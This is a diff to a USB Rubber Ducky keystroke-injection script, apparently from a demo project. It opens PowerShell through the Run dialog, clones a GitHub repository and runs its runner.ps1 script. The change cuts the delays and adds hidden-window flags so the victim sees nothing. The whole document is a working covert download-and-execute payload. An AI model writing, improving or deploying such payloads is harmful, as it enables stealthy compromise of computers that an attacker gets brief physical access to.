@@ -4,17 +4,15 @@ REM Allocates time for computer to recognize ducky as a keyboard
 DELAY 1000
 
 GUI r
-DELAY 5000
-STRING powershell -NoP -NonI
+DELAY 200
+STRING powershell -NoP -NonI -W hidden
 ENTER
 
-DELAY 5000
+DELAY 200
 
 STRING git clone https://github.com/lassemand/rubberducky_demo
 ENTER
 
-STRING cd rubberducky_demo
-ENTER
-
-STRING Start-Process -FilePath powershell.exe -ArgumentList '-NoExit -Command .\runner.ps1'
+DELAY 10
+STRING Start-Process -FilePath powershell.exe -WindowStyle hidden -WorkingDirectory ".\rubberducky_demo" -ArgumentList '-NoExit -Command .\runner.ps1'
 ENTER
